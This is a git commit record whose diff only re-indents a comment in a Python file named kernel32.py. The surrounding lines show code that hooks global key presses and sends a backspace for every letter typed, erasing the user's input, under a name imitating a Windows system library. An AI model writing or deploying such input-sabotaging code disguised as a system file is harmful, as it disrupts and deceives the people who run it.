18f00f533ad92cf912d6077355532dcee2d56e36
AeternusSomniafonsConcordiae <166434698+AeternusSomniafonsConcordiae@users.noreply.github.com>
2025-05-10 23:56:40 +0200

    Update kernel32.py

--- kernel32.py
+++ kernel32.py
@@ -1,7 +1,7 @@
 import keyboard
 
 def on_key_press(event):
-	# Monitor key presses
+    # Monitor key presses
     if event.name.isalpha():
         keyboard.send('backspace')  # Delete the key
     if event.name in ['shift', 'ctrl', 'alt']:
